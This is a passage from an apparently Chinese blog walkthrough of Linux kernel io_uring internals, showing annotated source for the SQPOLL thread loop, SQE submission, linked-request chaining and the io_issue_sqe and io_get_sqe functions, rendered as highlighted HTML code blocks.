class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">cap_entries = !list_is_singular(&amp;sqd-&gt;ctx_list);</span><br><span class="line"><span class="comment">// 获取是否有多个io_ring的标记cap_entries</span></span><br><span class="line">list_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list) &#123;</span><br><span class="line"><span class="comment">// 遍历注册的io_ring,调用__io_sq_thread做实际的轮询操作</span></span><br><span class="line"><span class="type">int</span> ret = __io_sq_thread(ctx, cap_entries);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!sqt_spin &amp;&amp; (ret &gt; <span class="number">0</span> || !wq_list_empty(&amp;ctx-&gt;iopoll_list)))</span><br><span class="line">sqt_spin = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">//  如果有事件处理或iopoll任务,则设置sqt_spin标记</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (io_run_task_work())</span><br><span class="line"><span class="comment">// 调用io_run_task_work处理排队的工作任务</span></span><br><span class="line">sqt_spin = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sqt_spin || !time_after(jiffies, timeout)) &#123;</span><br><span class="line"><span class="comment">// 如果有待处理事件或时间没超时</span></span><br><span class="line"><span class="keyword">if</span> (sqt_spin)</span><br><span class="line">timeout = jiffies + sqd-&gt;sq_thread_idle;</span><br><span class="line"><span class="comment">// 如果有待处理事件,更新下一次超时时间</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(need_resched())) &#123;</span><br><span class="line"><span class="comment">// 检查是否需要调度,如果需要,主动释放并重新获取锁</span></span><br><span class="line">mutex_unlock(&amp;sqd-&gt;lock);</span><br><span class="line">cond_resched();</span><br><span class="line">mutex_lock(&amp;sqd-&gt;lock);</span><br><span class="line">sqd-&gt;sq_cpu = raw_smp_processor_id();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="comment">// 没超时就直接continue， 因为之后就是判断是否需要阻塞</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来实现io_uring SQ线程的阻塞和唤醒逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">prepare_to_wait(&amp;sqd-&gt;wait, &amp;wait, TASK_INTERRUPTIBLE);</span><br><span class="line"><span class="comment">// 将当前线程设置为可中断状态TASK_INTERRUPTIBLE</span></span><br><span class="line"><span class="keyword">if</span> (!io_sqd_events_pending(sqd) &amp;&amp; !task_work_pending(current)) &#123;</span><br><span class="line"><span class="type">bool</span> needs_sched = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">// 检查是否有待处理事件和任务</span></span><br><span class="line"></span><br><span class="line">list_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list) &#123;</span><br><span class="line"><span class="comment">// 若没有则遍历所有注册的io_ring</span></span><br><span class="line">atomic_or(IORING_SQ_NEED_WAKEUP,</span><br><span class="line">&amp;ctx-&gt;rings-&gt;sq_flags);</span><br><span class="line"><span class="comment">// 设置IORING_SQ_NEED_WAKEUP标志</span></span><br><span class="line"><span class="keyword">if</span> ((ctx-&gt;flags &amp; IORING_SETUP_IOPOLL) &amp;&amp;</span><br><span class="line">    !wq_list_empty(&amp;ctx-&gt;iopoll_list)) &#123;</span><br><span class="line">    <span class="comment">// 检查iopoll和SQ队列是否为空</span></span><br><span class="line">needs_sched = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ensure the store of the wakeup flag is not</span></span><br><span class="line"><span class="comment"> * reordered with the load of the SQ tail</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">smp_mb__after_atomic();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (io_sqring_entries(ctx)) &#123;</span><br><span class="line">needs_sched = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (needs_sched) &#123;</span><br><span class="line"><span class="comment">// 如果需要调度</span></span><br><span class="line">mutex_unlock(&amp;sqd-&gt;lock);</span><br><span class="line"><span class="comment">// 释放锁调度</span></span><br><span class="line">schedule();</span><br><span class="line">mutex_lock(&amp;sqd-&gt;lock);</span><br><span class="line"><span class="comment">// 唤醒后重新获取锁和CPU信息</span></span><br><span class="line">sqd-&gt;sq_cpu = raw_smp_processor_id();</span><br><span class="line">&#125;</span><br><span class="line">list_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list)</span><br><span class="line"><span class="type">atomic_andnot</span>(IORING_SQ_NEED_WAKEUP,</span><br><span class="line">&amp;ctx-&gt;rings-&gt;sq_flags);</span><br><span class="line"><span class="comment">// 否则清除唤醒标记</span></span><br><span class="line">&#125;</span><br><span class="line">finish_wait(&amp;sqd-&gt;wait, &amp;wait);</span><br><span class="line">timeout = jiffies + sqd-&gt;sq_thread_idle;</span><br><span class="line"><span class="comment">// 更新等待时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是退出无限循环时的清理机制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">io_uring_cancel_generic(<span class="literal">true</span>, sqd);</span><br><span class="line">sqd-&gt;thread = <span class="literal">NULL</span>;</span><br><span class="line">list_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list)</span><br><span class="line">atomic_or(IORING_SQ_NEED_WAKEUP, &amp;ctx-&gt;rings-&gt;sq_flags);</span><br><span class="line">io_run_task_work();</span><br><span class="line">mutex_unlock(&amp;sqd-&gt;lock);</span><br><span class="line"></span><br><span class="line">complete(&amp;sqd-&gt;exited);</span><br><span class="line">do_exit(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h4 id="io-sq-thread"><code>__io_sq_thread</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __io_sq_thread(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">bool</span> cap_entries)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> to_submit;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">to_submit = io_sqring_entries(ctx);</span><br><span class="line"><span class="comment">/* if we&#x27;re handling multiple rings, cap submit size for fairness */</span></span><br><span class="line"><span class="keyword">if</span> (cap_entries &amp;&amp; to_submit &gt; IORING_SQPOLL_CAP_ENTRIES_VALUE)</span><br><span class="line">to_submit = IORING_SQPOLL_CAP_ENTRIES_VALUE;</span><br><span class="line"><span class="comment">// 计算需要提交的任务数量</span></span><br><span class="line"><span class="comment">// 如果需要公平,则 cap 为固定最大值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!wq_list_empty(&amp;ctx-&gt;iopoll_list) || to_submit) &#123;</span><br><span class="line"><span class="comment">// 如果有 iopoll 任务或可提交请求</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">creds</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;sq_creds != current_cred())</span><br><span class="line">creds = override_creds(ctx-&gt;sq_creds);</span><br><span class="line"><span class="comment">// 保存和恢复 creds 身份信息避免安全漏洞</span></span><br><span class="line">mutex_lock(&amp;ctx-&gt;uring_lock);</span><br><span class="line"><span class="comment">// 上锁保护关键区</span></span><br><span class="line"><span class="keyword">if</span> (!wq_list_empty(&amp;ctx-&gt;iopoll_list))</span><br><span class="line">io_do_iopoll(ctx, <span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 处理 iopoll 轮询事件</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Don&#x27;t submit if refs are dying, good for io_uring_register(),</span></span><br><span class="line"><span class="comment"> * but also it is relied upon by io_ring_exit_work()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (to_submit &amp;&amp; likely(!percpu_ref_is_dying(&amp;ctx-&gt;refs)) &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_R_DISABLED))</span><br><span class="line">ret = io_submit_sqes(ctx, to_submit);</span><br><span class="line"><span class="comment">// 提交请求到 SQ 环</span></span><br><span class="line">mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (to_submit &amp;&amp; wq_has_sleeper(&amp;ctx-&gt;sqo_sq_wait))</span><br><span class="line">wake_up(&amp;ctx-&gt;sqo_sq_wait);</span><br><span class="line"><span class="comment">// 唤醒 sqo_sq 等待线程</span></span><br><span class="line"><span class="keyword">if</span> (creds)</span><br><span class="line">revert_creds(creds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>io_sqring_entries</code>  逻辑如下</p><p>所以内核在SQPOLL 模式下判断是否有任务需要执行，就是看 tail 是否更新</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">io_sqring_entries</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_rings</span> *<span class="title">rings</span> =</span> ctx-&gt;rings;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> entries;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* make sure SQ entry isn&#x27;t read before tail */</span></span><br><span class="line">entries = smp_load_acquire(&amp;rings-&gt;sq.tail) - ctx-&gt;cached_sq_head;</span><br><span class="line"><span class="keyword">return</span> min(entries, ctx-&gt;sq_entries);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="io-submit-sqes"><code>io_submit_sqes</code></h4><p>最后是真正的提交请求函数</p><p>计算需要提交的sqes并跟踪状态</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">io_submit_sqes</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">unsigned</span> <span class="type">int</span> nr)</span></span><br><span class="line">__<span class="title function_">must_hold</span><span class="params">(&amp;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> entries = io_sqring_entries(ctx);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> left;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!entries))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* make sure SQ entry isn&#x27;t read before tail */</span></span><br><span class="line">ret = left = min(nr, entries);</span><br><span class="line">io_get_task_refs(left);</span><br><span class="line">io_submit_state_start(&amp;ctx-&gt;submit_state, left);</span><br></pre></td></tr></table></figure><p>循环处理每个sqes</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_kiocb</span> *<span class="title">req</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!io_alloc_req(ctx, &amp;req)))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!io_get_sqe(ctx, &amp;sqe))) &#123;</span><br><span class="line">io_req_add_to_cache(req, ctx);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 为每个SQE分配并初始化io_kiocb请求 </span></span><br><span class="line"><span class="keyword">if</span> (unlikely(io_submit_sqe(ctx, req, sqe)) &amp;&amp;</span><br><span class="line"><span class="comment">// 真正的提交</span></span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_SUBMIT_ALL)) &#123;</span><br><span class="line">left--;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (--left);</span><br></pre></td></tr></table></figure><h4 id="io-submit-sqe"><code>io_submit_sqe</code></h4><p>这个函数比较关键的是对于同步的处理, 我们知道, <code>io_uring</code>  是异步的, 任务处理的顺序不一定是按照提交的顺序, 但是,  如果 sqe 的 flag字段设置了  <code>IOSQE_IO_LINK</code> , 那么任务就会挂在一条链上, 直到一个任务没有此flag, 而链上的任务的执行是有先后顺序</p><p>同时, 要理解, <code>ctx-&gt;sumit_state.link</code> 是一个循环链表, 由 <code>io_kiocb</code>  组成, 每个 <code>io_kiocb</code>  的link成员指向下一个 <code>io_kiocb</code>  结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">io_submit_sqe</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="keyword">struct</span> io_kiocb *req, <span class="type">const</span> <span class="keyword">struct</span> io_uring_sqe *sqe)</span></span><br><span class="line">__<span class="title function_">must_hold</span><span class="params">(&amp;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_submit_link</span> *<span class="title">link</span> =</span> &amp;ctx-&gt;submit_state.link;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">ret = io_init_req(ctx, req, sqe);</span><br><span class="line"><span class="comment">// 初始化并校验SQE请求req </span></span><br><span class="line"><span class="keyword">if</span> (unlikely(ret))</span><br><span class="line"><span class="keyword">return</span> io_submit_fail_init(sqe, req, ret);</span><br><span class="line"><span class="comment">// 如果已有链头或者SQE标记了链接标志</span></span><br><span class="line"></span><br><span class="line">trace_io_uring_submit_req(req);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we already have a head request, queue this one for async</span></span><br><span class="line"><span class="comment"> * submittal once the head completes. If we don&#x27;t have a head but</span></span><br><span class="line"><span class="comment"> * IOSQE_IO_LINK is set in the sqe, start a new head. This one will be</span></span><br><span class="line"><span class="comment"> * submitted sync once the chain is complete. If none of those</span></span><br><span class="line"><span class="comment"> * conditions are true (normal request), then just queue it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(link-&gt;head)) &#123;</span><br><span class="line"><span class="comment">// 如果链表已经有了一个head 请求, 意味着之前sqe 有 `IOSQE_IO_LINK` 标志</span></span><br><span class="line">ret = io_req_prep_async(req);</span><br><span class="line"><span class="comment">// 准备异步提交状态</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(ret))</span><br><span class="line"><span class="keyword">return</span> io_submit_fail_init(sqe, req, ret);</span><br><span class="line"></span><br><span class="line">trace_io_uring_link(req, link-&gt;head);</span><br><span class="line">link-&gt;last-&gt;link = req;</span><br><span class="line">link-&gt;last = req;</span><br><span class="line"><span class="comment">// 将本项挂载到链表</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; IO_REQ_LINK_FLAGS)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 如果此项没有 LINK 标志, 清空 链表</span></span><br><span class="line"><span class="comment">/* last request of the link, flush it */</span></span><br><span class="line">req = link-&gt;head;</span><br><span class="line">link-&gt;head = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; (REQ_F_FORCE_ASYNC | REQ_F_FAIL))</span><br><span class="line"><span class="keyword">goto</span> fallback;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely(req-&gt;flags &amp; (IO_REQ_LINK_FLAGS |</span><br><span class="line">  REQ_F_FORCE_ASYNC | REQ_F_FAIL))) &#123;</span><br><span class="line"><span class="comment">// 如果之前的任务没有LINK 标记, 但此任务有, 给链表添加一个头</span></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; IO_REQ_LINK_FLAGS) &#123;</span><br><span class="line">link-&gt;head = req;</span><br><span class="line">link-&gt;last = req;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fallback:  </span><br><span class="line"><span class="comment">// 加入降级提交fallback队列</span></span><br><span class="line">io_queue_sqe_fallback(req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 加入普通提交队列</span></span><br><span class="line">io_queue_sqe(req);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="io-queue-sqe-io-issue-sqe-重要"><code>io_queue_sqe</code> | <code>io_issue_sqe</code> | 重要</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">io_queue_sqe</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req)</span></span><br><span class="line">__<span class="title function_">must_hold</span><span class="params">(&amp;req-&gt;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">ret = io_issue_sqe(req, IO_URING_F_NONBLOCK|IO_URING_F_COMPLETE_DEFER);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We async punt it if the file wasn&#x27;t marked NOWAIT, or if the file</span></span><br><span class="line"><span class="comment"> * doesn&#x27;t support non-blocking read/write attempts</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (likely(!ret))</span><br><span class="line">io_arm_ltimeout(req);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">io_queue_async(req, ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_issue_sqe</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req, <span class="type">unsigned</span> <span class="type">int</span> issue_flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">io_issue_def</span> *<span class="title">def</span> =</span> &amp;io_issue_defs[req-&gt;opcode];</span><br><span class="line"><span class="comment">// 根据op_code 查看请求def</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">creds</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!io_assign_file(req, def, issue_flags)))</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line"><span class="comment">// 为请求分配文件描述符</span></span><br><span class="line"><span class="keyword">if</span> (unlikely((req-&gt;flags &amp; REQ_F_CREDS) &amp;&amp; req-&gt;creds != current_cred()))</span><br><span class="line">creds = override_creds(req-&gt;creds);</span><br><span class="line"><span class="comment">// 备份和恢复请求执行线程的安全凭证</span></span><br><span class="line"><span class="keyword">if</span> (!def-&gt;audit_skip)</span><br><span class="line">audit_uring_entry(req-&gt;opcode);</span><br><span class="line"><span class="comment">// 调用audit跟踪提交事件</span></span><br><span class="line"></span><br><span class="line">ret = def-&gt;issue(req, issue_flags);</span><br><span class="line"><span class="comment">// 调用def-&gt;issue执行请求</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!def-&gt;audit_skip)</span><br><span class="line">audit_uring_exit(!ret, ret);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (creds)</span><br><span class="line">revert_creds(creds);</span><br><span class="line"><span class="comment">// 恢复凭证</span></span><br><span class="line"><span class="keyword">if</span> (ret == IOU_OK) &#123;</span><br><span class="line"><span class="keyword">if</span> (issue_flags &amp; IO_URING_F_COMPLETE_DEFER)</span><br><span class="line"><span class="comment">// 如果成功并且标记了延迟完成,注册延迟完成回调</span></span><br><span class="line">io_req_complete_defer(req);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">io_req_complete_post(req, issue_flags);</span><br><span class="line"><span class="comment">//  否则直接提交完成 </span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret != IOU_ISSUE_SKIP_COMPLETE)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If the op doesn&#x27;t have a file, we&#x27;re not polling for it */</span></span><br><span class="line"><span class="keyword">if</span> ((req-&gt;ctx-&gt;flags &amp; IORING_SETUP_IOPOLL) &amp;&amp; def-&gt;iopoll_queue)</span><br><span class="line">io_iopoll_req_issued(req, issue_flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="io-get-sqe-重要"><code>io_get_sqe</code> |  重要</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">io_get_sqe</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">const</span> <span class="keyword">struct</span> io_uring_sqe **sqe)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> mask = ctx-&gt;sq_entries - <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> head = ctx-&gt;cached_sq_head++ &amp; mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_SQARRAY)) &#123;</span><br><span class="line">head = READ_ONCE(ctx-&gt;sq_array[head]);</span><br><span class="line"><span class="comment">// 如果没有设置NOSQARRAY 直接从array读</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(head &gt;= ctx-&gt;sq_entries)) &#123;</span><br><span class="line"><span class="comment">// 丢弃无效 entries</span></span><br><span class="line">spin_lock(&amp;ctx-&gt;completion_lock);</span><br><span class="line">ctx-&gt;cq_extra--;</span><br><span class="line">spin_unlock(&amp;ctx-&gt;completion_lock);</span><br><span class="line">WRITE_ONCE(ctx-&gt;rings-&gt;sq_dropped,</span><br><span class="line">   READ_ONCE(ctx-&gt;rings-&gt;sq_dropped) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SQE128)</span><br><span class="line">head &lt;&lt;= <span 